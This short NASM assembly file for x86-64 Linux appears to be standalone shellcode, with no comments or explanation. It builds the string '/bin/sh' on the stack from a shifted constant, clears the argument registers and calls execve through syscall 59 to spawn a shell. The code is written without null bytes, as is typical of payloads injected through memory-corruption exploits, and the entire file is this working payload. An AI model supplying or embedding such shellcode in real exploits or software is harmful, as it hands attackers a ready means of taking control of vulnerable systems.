BITS 64
global _start
_start:
    xor rax,rax
    push rax
    mov rdi,0x68732f6e69622f2f
    shr rdi,0x8
    push rdi
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    mov al,0x3b
    syscall
